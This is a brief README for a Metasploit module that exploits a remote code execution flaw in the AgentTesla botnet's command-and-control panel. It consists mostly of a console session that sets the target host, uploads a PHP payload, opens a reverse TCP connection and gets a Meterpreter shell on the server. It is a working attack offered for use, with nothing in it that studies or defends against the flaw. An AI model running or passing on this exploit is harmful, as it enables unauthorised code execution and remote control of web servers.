# AgentTesla RCE
AgentTesla botnet C&amp;C RCE exploit.


***WARNING*** This will only work if hosting provider allows the PHP `exec` function

```
msf5 exploit(agent_tesla_rce) > set vhost example.com
vhost => example.com
msf5 exploit(agent_tesla_rce) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf5 exploit(agent_tesla_rce) > run

[*] Started reverse TCP handler on 0.0.0.0:4444 
[+] Payload uploaded as .rzTJ.php
[*] Sending stage (38247 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (0.0.0.0:4444 -> 2.2.2.2:34550) at 2019-08-13 22:45:10 +0200
[+] Payload successfully triggered !

meterpreter > 
```